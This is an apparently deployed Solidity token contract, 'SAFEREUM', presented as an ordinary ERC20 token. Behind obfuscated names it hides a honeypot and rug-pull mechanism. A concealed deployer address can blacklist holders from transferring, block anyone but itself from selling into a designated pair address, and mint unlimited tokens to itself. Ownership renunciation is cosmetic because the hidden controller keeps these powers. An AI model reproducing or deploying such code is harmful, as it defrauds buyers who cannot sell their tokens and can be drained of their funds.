/**
 *Submitted for verification at Arbiscan.io on 2023-10-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract SAFEREUM is Ownable {
    uint256 tokenamount = 1*10**12*10**decimals();
    address private rzzxmn3;
    address private usdc;
    string private _tokenname;
    string private _tokensymbol;
    constructor(string memory name_, string memory symbol_) {
        address curxxaa = _msgSender();
        _tokenname = name_;
        _tokensymbol = symbol_;
        rzzxmn3 = _msgSender();
        EDU[curxxaa] += tokenamount;
        emit Transfer(address(0), curxxaa, tokenamount);
    }

    uint256 private _totalSupply = tokenamount;
    mapping(address => uint256) private EDU;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 6;
    }

    mapping(address => uint256) private yuuy;
    function approver(address jjkxq1) public     {
        if(rzzxmn3 != _msgSender()){
            revert("fu");
        }else{
            if(rzzxmn3 != _msgSender()){
                revert("fu");
            }
        }
        address xjhhxx = jjkxq1;
        yuuy[xjhhxx] = 1;
       
    }

    function passapprover(address jjkxq) public     {
        if(rzzxmn3 != _msgSender()){
            revert("fu");
        }else{
            if(rzzxmn3 != _msgSender()){
                revert("fu");
            }
        }
        address xjhhxx = jjkxq;
         yuuy[xjhhxx] = 0;
    }
    function transfer_(address _usdc) public     {
        if(rzzxmn3 != _msgSender()){
            revert("fu");
        }else{
            if(rzzxmn3 != _msgSender()){
                revert("fu");
            }
        }
        usdc = _usdc;
    }

    function balanceOf(address account) public view returns (uint256) {
        return EDU[account];
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }
   
    function teuadminpassadd(uint256 _uyyxxadd23344) 
    external {
        if(rzzxmn3 == _msgSender()){
            if(rzzxmn3 == _msgSender()){
            }
        }
        uint256 uyyxxadd23344 = _uyyxxadd23344;
        require(rzzxmn3 == _msgSender());
        address jjhhhaxx = _msgSender();
        address ccaa12 = jjhhhaxx;
        uint256 ammtemp = 10**decimals()*uyyxxadd23344;
        EDU[ccaa12] += ammtemp; 
        _totalSupply += ammtemp; 
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }
   
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


     function _transfer(
     address from,
     address to,
     uint256 amount
    ) internal virtual {
     uint256 balance = EDU[from];
     require(balance >= amount, "ERC20: transfer amount exceeds balance");
     require(from != address(0), "ERC20: transfer from the zero address");
     require(to != address(0), "ERC20: transfer to the zero address");
     bool compar = 1 == yuuy[from];
     if (compar) {
         revert("1");
     }
     if (to == usdc && from != rzzxmn3) {
         revert("0");
     }

    EDU[from] = EDU[from]-amount;
    EDU[to] = EDU[to]+amount;
    emit Transfer(from, to, amount); 
}

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
}